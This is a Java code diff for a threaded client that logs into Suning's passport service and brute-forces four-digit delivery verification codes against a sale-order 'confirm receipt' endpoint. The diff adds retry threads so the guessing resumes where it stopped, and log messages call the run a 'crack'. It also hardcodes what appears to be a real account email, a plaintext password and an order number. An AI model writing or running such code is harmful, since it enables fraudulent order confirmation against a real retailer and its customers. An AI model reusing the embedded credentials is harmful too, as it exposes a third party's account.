@@ -12,17 +12,18 @@ import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.impl.client.HttpClients;
 
 public class MainClient extends Thread{ 
-	private static List<Cookie> loginCookies;
-	private static BasicCookieStore cookieStore = new BasicCookieStore();
-	private static CloseableHttpClient httpclient = HttpClients.custom()
+	private BasicCookieStore cookieStore = new BasicCookieStore();
+	private CloseableHttpClient httpclient = HttpClients.custom()
     .setDefaultCookieStore(cookieStore)
     .build();
 	private VerifyCode vc = new VerifyCode();
 	private SelectDeliverInform sdi = new SelectDeliverInform();
 	private Login lg = new Login();
 	private VerifyCodeManager vcm = new VerifyCodeManager();
-	private int codeInt = 1;
-	private int codeNow = 1;
+	private int codeInt = 3000;
+	private int codeNow = 0;
+	
+	
 	public int getCodeNow() {
 		return codeNow;
 	}
@@ -31,24 +32,47 @@ public class MainClient extends Thread{
 		this.codeNow = codeNow;
 	}
 
-	private String userName = "";
-	private String password = "";
-	private String saleOrderNo = "";
-		
+	String userName = "";
+	String password = "";
+	String saleOrderNo = "";
+	
+	
+	private static String cacheUsername = "";
+	private static String cachePassword = "";
+	private static String cacheLoginURL = "https://passport.suning.com/ids/login";
+	
+	public static void main(String[] args) {
+		MainClient mc = new MainClient();
+		mc.setUserName("haoyueshangmao@163.com");
+		mc.setPassword("sn26524316");
+		mc.setSaleOrderNo("00015683400601");
+		mc.start();
+	}	
+	
+	public void reTry(int code){
+		MainClient mc = new MainClient();
+		mc.setUserName("haoyueshangmao@163.com");
+		mc.setPassword("sn26524316");
+		mc.setSaleOrderNo("00015683400601");
+		mc.setCodeInt(code);
+		mc.start();
+	}
+	
 	public void run(){
 		try {
-			startThis(this.getUserName(), this.getPassword(), this.getSaleOrderNo());
+			startThis(this.getUserName(), this.getPassword(), this.getSaleOrderNo(),this.getCodeInt(),this);
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 	}
 
-    public String startThis(String userName,String password,String saleOrderNo) throws Exception {
+    public String startThis(String userName,String password,String saleOrderNo,int startCode,MainClient mc) throws Exception {
+    	this.cacheUsername = userName;
+    	this.cachePassword = password;
+    	//System.out.println("尝试中，用户名 = " + userName + "  销售单号 = " + saleOrderNo );
     	
-    	System.out.println("尝试中，用户名 = " + userName + "  销售单号 = " + saleOrderNo );
-    	
-    	if(!login(userName, password)){
+    	if(!login(userName, password,mc)){
     		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   失败 ，验证码测试到" + this.getCodeInt());
     		return "登录失败";
     	} 
@@ -59,37 +83,45 @@ public class MainClient extends Thread{
     		return "查询失败";
     	} 
     	**/
-    	vcm.saveVerifyCode(saleOrderNo,this.getCodeInt(),this.getSdi().getSearchResult(),1);
-    	
-    	if(!tryCode(saleOrderNo,1)){
-    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   失败 ，验证码测试到" + this.getCodeInt());
-    		Thread.currentThread();
-			Thread.sleep(10000);
-    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   重试中");
-    		if(login(userName, password) && select(saleOrderNo) && tryCode(saleOrderNo,this.getCodeNow())){
-    			//continue;
-    		}else{
-    			return "破解失败";
-    		}
-    	} 
-    	
-    	//关闭client
-    	//closeClient(); 
-    	
-    	System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   成功  ，验证码是  " + this.getCodeInt());
-    	//成功后做记录
-    	if(vcm.updateVerifyCode(saleOrderNo,this.getCodeInt(),this.getSdi().getSearchResult(),0)){
-    		System.out.println("销售订单号=" + saleOrderNo + "验证码=" + this.getCodeInt() + " 保存成功");
-    	}else{
-    		System.out.println("销售订单号=" + saleOrderNo + "验证码=" + this.getCodeInt() + " 保存失败");
+    	if(startCode == 0){
+    		vcm.saveVerifyCode(saleOrderNo,this.getCodeInt(),this.getSdi().getSearchResult(),1);
     	}
-    	return "成功";
+    	
+    	
+    	if(!tryCode(saleOrderNo,startCode,mc)){
+    		if(getCodeNow() >= 0){
+    			closeClient();
+        		reTry(this.getCodeNow());
+    		}
+    		
+//    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   失败 ，验证码测试到" + this.getCodeInt());
+//    		Thread.currentThread();
+//			Thread.sleep(10000);
+//    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   重试中");
+//    		if(login(userName, password) && tryCode(saleOrderNo,this.getCodeNow())){
+//    			//continue;
+//    		}else{
+//    			return "破解失败";
+//    		}
+    		return "其他进程中重试";
+    	}else{
+    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   成功  ，验证码是  " + this.getCodeInt());
+        	//成功后做记录
+        	if(vcm.updateVerifyCode(saleOrderNo,this.getCodeInt(),this.getSdi().getSearchResult(),0)){
+        		System.out.println("销售订单号=" + saleOrderNo + "验证码=" + this.getCodeInt() + " 保存成功");
+        	}else{
+        		System.out.println("销售订单号=" + saleOrderNo + "验证码=" + this.getCodeInt() + " 保存失败");
+        	}
+        	return "成功";
+    	}
+
+    	
     }
     
     
     private boolean closeClient(){
     	try {
-			MainClient.getHttpclient().close();	
+			this.getHttpclient().close();	
 			return true;
 		} catch (IOException e) {
 			e.printStackTrace();
@@ -97,19 +129,23 @@ public class MainClient extends Thread{
     	return false;
     }
     
-    private boolean tryCode(String saleOrderNo,int startCode) {
+    private boolean tryCode(String saleOrderNo,int startCode,MainClient mc) {
     	//尝试验证
     	try{
-    		System.out.println("开始验证时间 =" + new Date());
-        	int verifycodeResult = verifycode(startCode,saleOrderNo);
+    		//System.out.println("开始验证时间 =" + new Date());
+        	int verifycodeResult = verifycode(startCode,saleOrderNo,mc);
 
     		if(verifycodeResult == 0){
         		System.out.println("验证完成，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
         	}else if(verifycodeResult == 1){
-        		System.out.println("验证停止，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
+        		//System.out.println("验证停止，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
+        		return false;
+        	}else if(verifycodeResult == 2){
+        		//System.out.println("验证停止，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
         		return false;
         	}else{
         		System.out.println("验证停止，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
+        		setCodeNow(-1);
         		return false;
         	}
         	
@@ -121,11 +157,11 @@ public class MainClient extends Thread{
     	return false;
     }
     
-    public boolean login(String userName,String password) throws URISyntaxException{
+    public boolean login(String userName,String password,MainClient mc) throws URISyntaxException{
     	//登录
     	
-    	if(true == lg.login(new URI("https://passport.suning.com/ids/login"),userName,password)){
-    		System.out.println("登录成功");  
+    	if(true == lg.loginpost(new URI("https://passport.suning.com/ids/login"),userName,password,mc)){
+    		System.out.println(userName + "登录成功");  
     		
 //    		if (null != loginCookies) {
 //    			System.out.println("登录cookies");
@@ -153,7 +189,7 @@ public class MainClient extends Thread{
     }
     
     //尝试验证码
-    private int verifycode(int startCode,String saleOrderNo) throws URISyntaxException {
+    int verifycode(int startCode,String saleOrderNo,MainClient mc) throws URISyntaxException {
     	int resultcode = -1;
     	int i = 0;
     	codeInt = startCode;
@@ -162,7 +198,13 @@ public class MainClient extends Thread{
     		codeStr = "0" + codeStr;
     	}
     	while(codeInt < 10000){
-    		resultcode = vc.VerifyCode(new URI("http://scs.suning.com/sps/saleOrder/updateConfirmReceipt.action"), codeStr,saleOrderNo);
+//    		try {
+//				Thread.sleep(1000);
+//			} catch (InterruptedException e) {
+//				// TODO Auto-generated catch block
+//				e.printStackTrace();
+//			}
+    		resultcode = vc.VerifyCode(new URI("http://scs.suning.com/sps/saleOrder/updateConfirmReceipt.action"), codeStr,saleOrderNo,mc);
     		if(resultcode == 1){   	
     			codeInt ++;
     			if(0 == (i % 100)){
@@ -176,8 +218,11 @@ public class MainClient extends Thread{
     		}else if (resultcode == 0){
             	System.out.println("saleOrderNo = " + saleOrderNo + " other result, result = " + resultcode);
     			break;
+    		}else if(resultcode == 2){
+    			this.setCodeNow(codeInt);
+    			break;
     		}else{
-    			this.setCodeNow(codeInt - 1);
+    			this.setCodeNow(codeInt);
     			System.out.println("saleOrderNo = " + saleOrderNo + " other result, result = " + resultcode);
     			break;
     		}
@@ -185,28 +230,13 @@ public class MainClient extends Thread{
 		return resultcode;
     }
 
-	public static List<Cookie> getLoginCookies() {
-		return loginCookies;
-	}
 
-	public static void setLoginCookies(List<Cookie> loginCookies) {
-		MainClient.loginCookies = loginCookies;
-	}
-
-	public static CloseableHttpClient getHttpclient() {
+	public CloseableHttpClient getHttpclient() {
 		return httpclient;
 	}
 
-	public static void setHttpclient(CloseableHttpClient httpclient) {
-		MainClient.httpclient = httpclient;
-	}
-
-	public static BasicCookieStore getCookieStore() {
-		return cookieStore;
-	}
-
-	public static void setCookieStore(BasicCookieStore cookieStore) {
-		MainClient.cookieStore = cookieStore;
+	public void setHttpclient(CloseableHttpClient httpclient) {
+		this.httpclient = httpclient;
 	}
 
 	public  VerifyCode getVc() {
@@ -242,26 +272,6 @@ public class MainClient extends Thread{
 	}
 
 
-	public String getUserName() {
-		return userName;
-	}
-
-
-	public void setUserName(String userName) {
-		this.userName = userName;
-	}
-
-
-	public String getPassword() {
-		return password;
-	}
-
-
-	public void setPassword(String password) {
-		this.password = password;
-	}
-
-
 	public String getSaleOrderNo() {
 		return saleOrderNo;
 	}
@@ -277,5 +287,33 @@ public class MainClient extends Thread{
 
 	public void setVcm(VerifyCodeManager vcm) {
 		this.vcm = vcm;
+	}
+
+	public String getUserName() {
+		return userName;
+	}
+
+	public void setUserName(String userName) {
+		this.userName = userName;
+	}
+
+	public String getPassword() {
+		return password;
+	}
+
+	public void setPassword(String password) {
+		this.password = password;
+	}
+
+	public static String getCacheUsername() {
+		return cacheUsername;
+	}
+
+	public static String getCachePassword() {
+		return cachePassword;
+	}
+
+	public static String getCacheLoginURL() {
+		return cacheLoginURL;
 	}
 }
